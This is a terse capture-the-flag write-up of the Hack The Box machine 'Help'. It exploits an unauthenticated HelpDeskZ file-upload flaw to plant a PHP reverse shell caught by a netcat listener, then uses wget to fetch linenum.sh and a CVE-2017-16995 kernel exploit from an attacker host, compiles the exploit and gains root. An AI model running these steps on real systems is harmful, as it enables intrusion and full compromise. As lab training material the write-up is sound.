root@kali:~/htb/help# nmap -sC -sV -oA nmap/initial 10.10.10.121
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-22 15:56 UTC
Nmap scan report for 10.10.10.121
Host is up (0.056s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds

searchsploit OpenSSH 7.2p2
  auxiliary/scanner/ssh/ssh_enumusers
  has a options to check for false postivies by passing completly random usernames before the wordlist entries
  metasploit reports false positive results, move on

check out port 3000 - nodejs which I don't know anything about, will come back to this later

run dirbuster with small directory list, quick results for /support directory.
/support contains a helpdeskz installation.  Spent some time trying some sql/command injection with no results
searched for helpdeskz in searchsploit - 2 vulnerabilities: 1 for authorized and 1 for unauthorized.
unauthorized - exploits file upload in ticketing system allowing upload of php files
  php-reverse-shell.php
    http[:]//pentestmonkey.net/tools/web-shells/php-reverse-shell
tried running exploit from exploit-db, script needed tweaking and is for python2.
searched github for cve, found updated python3 script. Still no success.
Read through script and noticed it relies on time. check time against webserver response headers,
webserver out of sync.
made python script to update local system time to webserver. Still doesn't work.

  helptime.py
  root@kali:~/htb/help# python helptime.py
  HELP time:
  Wed, 22 May 2019 18:26:22 GMT
  System time:
  Wed 22 May 18:35:53 UTC 2019

  timesync.py
  root@kali:~/htb/help# python timesync.py
  Original system date:
  Wed 22 May 18:37:33 UTC 2019
  HELP Datetime: 2019-05-22 18:28:01
  new system date:
  Wed 22 May 18:28:01 UTC 2019

set the local host and port in the php reverse shell
set up a netcat listener
nc -vnlp 9999

root@kali:~/htb/help# python exploit.py http://10.10.10.121/support/ rshell.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
Sorry, I did not find anything

read script again, script is trying to find the uploaded file, where are files uploaded in helpdesk?
check source code of helpdeskz to find files are uploaded to /uploads/tickets/.  Added this to script and got shell

HelpDeskZ-1.0/controllers/submit_ticket_controller.php
137   if(!isset($error_msg) && $settings['ticket_attachment']==1){
138     $uploaddir = UPLOAD_DIR.'tickets/';
139     if($_FILES['attachment']['error'] == 0){
140     $ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
141     $filename = md5($_FILES['attachment']['name'].time()).".".$ext;
142     $fileuploaded[] = array('name' => $_FILES['attachment']['name'],
143     'enc' => $filename,
144     'size' => formatBytes($_FILES['attachment']['size']),
145     'filetype' => $_FILES['attachment']['type']);
146     $uploadedfile = $uploaddir.$filename;
        ...

 HelpDeskZ-1.0/includes/global.php
 18   define('UPLOAD_DIR', ROOTPATH . 'uploads/');

 root@kali:~/htb/help# python exploit.py http://10.10.10.121/support/uploads/tickets/ rshell.php
 Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
 found!
 http://10.10.10.121/support/uploads/tickets/fc7240781f3464afcebb47bd8da49b9a.php

from this shell we can find user flag
whoami
help
cat /home/help/user.txt

help@help:/$ cd /tmp
cd /tmp
help@help:/tmp$ wget http://10.10.14.9:6666/linenum.sh

help@help:/tmp$ wget http://10.10.14.9:6666/linenum.sh
wget http://10.10.14.9:6666/linenum.sh
--2019-05-22 13:26:25--  http://10.10.14.9:6666/linenum.sh
Connecting to 10.10.14.9:6666... connected.
HTTP request sent, awaiting response... 200 OK
Length: 45639 (45K) [text/x-sh]
Saving to: 'linenum.sh'

linenum.sh          100%[===================>]  44.57K   283KB/s    in 0.2s

2019-05-22 13:26:25 (283 KB/s) - 'linenum.sh' saved [45639/45639]

help@help:/tmp$ chmod +x linenum.sh
chmod +x linenum.sh
help@help:/tmp$ ./linenum.sh

Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 2016

root@kali:~/htb/help# searchsploit 4.4.0-116
---------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                |  Path
                                                                                              | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------- ----------------------------------------
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                        | exploits/linux/local/44298.c
---------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

CVE: 2017-16995
Current Description

The check_alu_op function in kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect sign extension.

I went with this exploit on github:
https://github.com/iBearcat/CVE-2017-16995/blob/master/exploit.c
which you simply compile on the target and execute.

help@help:/tmp$ wget http://10.10.14.9:6666/exploit.c
wget http://10.10.14.9:6666/exploit.c
--2019-05-22 13:59:50--  http://10.10.14.9:6666/exploit.c
Connecting to 10.10.14.9:6666... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5775 (5.6K) [text/plain]
Saving to: 'exploit.c'

exploit.c           100%[===================>]   5.64K  --.-KB/s    in 0.01s

2019-05-22 13:59:50 (509 KB/s) - 'exploit.c' saved [5775/5775]

help@help:/tmp$ gcc exploit.c -o makemeroot
gcc exploit.c -o makemeroot
help@help:/tmp$ chmod +x makemeroot
chmod +x makemeroot
help@help:/tmp$ ./makemeroot
./makemeroot
task_struct = ffff880010cbaa00
uidptr = ffff880036aef2c4
spawning root shell
root@help:/tmp# whoami
whoami
root
root@help:/tmp#

root@help:/tmp# cd /root
cd /root
root@help:/root# ls
ls
root.txt
root@help:/root# cat root.txt
cat root.txt
b7fe6082dcdf0c1b1e02ab0d9daddb98


now to privesc

get a copy of linenum and host it with python3 -m http.server 6666
wget http://10.10.14.9:6666/linenum.sh
./linenum.sh
